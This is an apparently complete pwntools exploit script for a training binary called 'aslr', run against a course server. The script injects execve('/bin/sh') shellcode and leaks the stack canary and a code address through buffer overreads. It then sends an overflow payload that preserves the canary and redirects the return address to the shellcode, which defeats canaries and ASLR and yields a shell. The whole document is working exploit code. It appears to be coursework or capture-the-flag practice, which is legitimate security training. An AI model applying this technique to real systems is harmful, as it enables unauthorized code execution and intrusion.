from pwn import *
import time
from socket import htonl


context.terminal = ['tmux', 'splitw', '-h']

if "REMOTE" not in args:
    r = process("./aslr")
    gdb.attach(r, """
  
    """)
else:
    r = remote("bin.training.offdef.it", 2012)


context.arch = 'amd64'
stringa = b"/bin/sh" + b"\x00"
asm_code = """
add r13, 0x200720
mov rax, 0x3b
xor rsi, rsi
xor rdx, rdx
mov rdi, r13
add rdi, 29
syscall
"""

shellcode = asm(asm_code)
r.send(shellcode + stringa)

input("wait")

r.send(b"A"*105)
r.recvuntil(b"> ")
r.read(105)
leaked_canary = b"\x00" + r.read(7)
canary = u64(leaked_canary)
print("[!] leaked_canary %#x" % canary)

input("Wait")
r.send(b"A"*136)
r.recvuntil(b"> ")
r.read(136)
leaked_main_address =  r.read(6) + b"\x00\x00" 

addr = u64(leaked_main_address)

print("leaked add %#x" %addr)
print("converted leaked %#d" %addr)

offset = 2098976

whereToJump = addr + offset 
print("Where to jump %#x" %whereToJump)
wtj = whereToJump.to_bytes(8, byteorder='little')

payload = b"A"*104 + leaked_canary + b"B"*8 + wtj

input("wait")
r.send(payload)

#0x00007ffff7c29d90 leaked in locale
#0x00007fffffffde72 start of buffer in locale


time.sleep(0.5)

input("wait")
r.sendline(b"")

r.interactive()